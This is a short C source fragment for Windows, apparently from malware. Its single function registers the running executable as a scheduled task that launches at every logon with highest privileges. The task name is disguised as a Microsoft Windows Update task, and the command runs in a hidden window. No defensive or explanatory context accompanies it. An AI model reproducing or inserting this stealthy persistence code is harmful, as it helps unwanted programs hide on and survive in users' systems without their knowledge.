#include <windows.h>
#include <stdio.h>

void add_persistence_task(void) {
    char path[MAX_PATH];
    char command[1024];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    snprintf(command, sizeof(command), "schtasks /create /tn \"Microsoft\\Windows\\Update\\Updater\" /tr \"%s\" /sc onlogon /rl highest /f", path);
    WinExec(command, SW_HIDE);
}
